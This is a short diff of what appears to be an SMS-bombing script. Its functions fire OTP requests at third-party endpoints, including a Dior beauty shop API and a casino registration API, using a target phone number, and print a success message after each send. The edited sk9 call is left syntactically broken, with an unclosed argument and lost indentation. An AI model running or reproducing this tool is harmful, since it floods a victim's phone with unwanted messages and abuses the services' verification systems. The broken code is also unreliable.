@@ -65,9 +65,7 @@ def sk8(phone):
     post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})
 print (f"Send number {phone} | Success ✓")
 def sk9(phone):
-
-    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone":
-
+post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone":
 print (f"Send number {phone} | Success ✓")
 
 def sk10(phone):
